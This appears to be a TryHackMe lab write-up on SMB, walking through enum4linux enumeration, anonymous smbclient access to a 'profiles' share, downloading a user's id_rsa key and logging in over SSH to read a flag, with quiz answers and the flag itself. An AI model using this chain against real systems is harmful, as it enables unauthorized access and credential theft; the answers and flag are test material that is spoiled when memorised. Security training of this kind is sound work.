## SMB (Server Message Block
Makes file systems and other resource available to clients on the network. Client computers may have their own hard disk, but they also want access to shared file systems and printers on the servers.

SMB protocol is known as a response-request protocol, meaning that it transmits multiple messages between the client and server to establish a connection. Clients connect to servers using TCP/IP

![image](https://github.com/Shawn-Nichol/TryHackMe/assets/30714313/1cc3adab-bc14-41c5-a893-a4af505c85c2)

Quesiton: What does SMB stand for?
Answer: Server Message Block

Question: What type of protocol is SMB?
Answer: Response-request

Question:  What do clients connect to servers using??
Answer: TCP/IP

Question: What system does Samba run on?
Answer: Unix

## Enumerang SMB
Enumeration is the process of gathering information on a target in order to find potential attack vectors and aid in exploitation.

The first step of enumeration is to conduct a port scan.

Enum4Linux is used to enumerate SMB shares on Windows and Linux systems. It is a wrapper around the tools in the Samba package and makes it easy to extract information from the target training to SMB quickly. 

Tags
- U get a user list
- M get the machine list
- Nget name list dump (different from -U and -M
- S get Sharelist
- Pget password policy information
- G gets group and member list
- a all of the above

Question: Conduct a Namp can of your choosing; how many ports are open? </br>
![image](https://github.com/Shawn-Nichol/TryHackMe/assets/30714313/8caa7cae-a0a4-4347-915d-065ac0ad0a2b)

Answer: 3

Question: What port is SMB running on? </br>
![image](https://github.com/Shawn-Nichol/TryHackMe/assets/30714313/105dac07-3b72-4232-823e-3003b0d57161)

Answer: 139/445

Question: Let's get started with Enum4Linux, and conduct a full basic enumeration. For starters, what is the workgroup name?
```
enum4linux -a 10.10.119.103
```

![image](https://github.com/Shawn-Nichol/TryHackMe/assets/30714313/a30138fc-5922-481e-9f4e-415d774d7bc8)

Answer: WORKGROUP

Question: What comes up as the name of the machine? </br>
![image](https://github.com/Shawn-Nichol/TryHackMe/assets/30714313/48b6fb78-d59d-4827-9235-04451b93bbc1)

Answer: POLOSMB

Question: What operating system version is running? </br>
![image](https://github.com/Shawn-Nichol/TryHackMe/assets/30714313/3904b623-979d-4db7-afca-45796ed43a7d)


Answer: 6.1

Question: What share sticks out as something we might want to investigate? </br>
![image](https://github.com/Shawn-Nichol/TryHackMe/assets/30714313/f3e615aa-32e0-43e2-9e62-418ccc89dd74)


Answer: profiles

## Exploiting SMB

SMB client is part of the default Samba suite. You can remotely access the SMB share using the syntax.
```
smbclient //[IP]//share
```
Followed by the tags 
- U [name]: specify the user
- P [port]: specify the port.

Question What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?
Answer: smbclient //10.10.10.2/secret -U suit -p 445


Question: Does the share allow anonymous access? Y/N?
```
smbclient //10.10.119.103/profiles -U Anonymous -p profiles
```
![image](https://github.com/Shawn-Nichol/TryHackMe/assets/30714313/858227ef-3db6-4939-86d1-6c2bce216bec)

Answer: Y

Question: Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?
Show dir
```
ls
```
![image](https://github.com/Shawn-Nichol/TryHackMe/assets/30714313/2c6a74ae-e908-4aea-a01a-efd2be0e2000)

Cat Work From returns as an invalid command. </br>
![image](https://github.com/Shawn-Nichol/TryHackMe/assets/30714313/ad8b5fdf-7f77-45c5-870a-20efe0d75457)

Use the help command to obtain a list of commands.
![image](https://github.com/Shawn-Nichol/TryHackMe/assets/30714313/6bd51fee-0624-4aba-9886-45df3f55e2ff)

The 'more command will allow you to view files. 
```
more "Working From Home information.txt"
```

![image](https://github.com/Shawn-Nichol/TryHackMe/assets/30714313/6b5d5190-6ca3-46a5-b8ce-71b7c2570f69)

Answer: John Cactus

Question: Okay! Now we know this, what directory on the share should we look in? </br>
Answer: .ssh

Question: This directory contains authentication keys that allow a user to authenticate themselves on and then access a server. Which of these keys is most useful to us? </br>
Change directories to .ssh and then list dirs.
```
cd .ssh
ls
```
The default name for SSH key pairs is id_rsa
Answer:id_rsa

Question: What is the smb.txt flag?
To download the id_rsa
```
get id_rsa
```
Get the user name from id_rsa.pub
cactus

Next, you will need to change the permissions to Read/Write, or the server will reject the key. 
```
chmod 600 id_rsa
```

Establish an SSH session. 
```
ssh -i id_rsa cactus@10.10.119.103
```
List dir of the remote server, and there is only one file; use cat to read the file.
```
ls
cat smb.txt
```



Answer: THM{smb_is_fun_eh?}
